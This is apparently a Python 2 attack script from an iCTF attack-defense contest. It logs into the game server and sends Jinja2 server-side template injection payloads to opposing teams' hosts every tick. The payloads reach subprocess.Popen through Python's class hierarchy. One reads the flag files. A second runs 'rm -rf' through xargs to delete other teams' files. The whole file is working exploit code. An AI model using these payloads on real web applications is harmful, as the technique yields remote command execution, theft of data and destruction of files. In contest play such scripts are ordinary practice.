#!/usr/bin/env python

import os
import urllib
import time
import pwn
import ictf

popen = 'config.__class__.__mro__[1].__subclasses__()[143]'
catflag = '{{%s("grep ../append/flags/* %%s")}}' % popen
rm = '{{%s("grep -L ../append/flags/* %%s | xargs -n 1 rm -rf")}}' % popen

urls = ('/see_unicorn?next=%s', '/catch_unicorn?next=%s', '/nice_try?next=%s')

def getunicorns(flag_id, host, port):
    catflag_query = urllib.quote(catflag % flag_id, safe='')
    rm_query = urllib.quote(rm % flag_id, safe='')

    for url in urls:
        r = pwn.remote(host, port)
        r.send('GET %s\r\n\r\n' % (url % catflag_query))
        # parse result here, break if found
        r.close()

        r = pwn.remote(host, port)
        r.send('GET %s\r\n\r\n' % (url % rm_query))
        r.close()


print 'Logging on...',
t = ictf.iCTF().login(os.environ['USER'], os.environ['PASS'])
print 'Done'

while True:
    while t.get_tick_info()['approximate_seconds_left'] < 5:
        time.sleep(0.01)

    print 'Getting targets... ',
    targets = t.get_targets(10009)['targets']
    print 'got %s' % len(targets)
    for targ in targets:
        try:
            if t.get_tick_info()['approximate_seconds_left'] < 5:
                break

            getunicorns(targ['flag_id'], targ['hostname'], targ['port'])

        except Exception as e:
            raise e
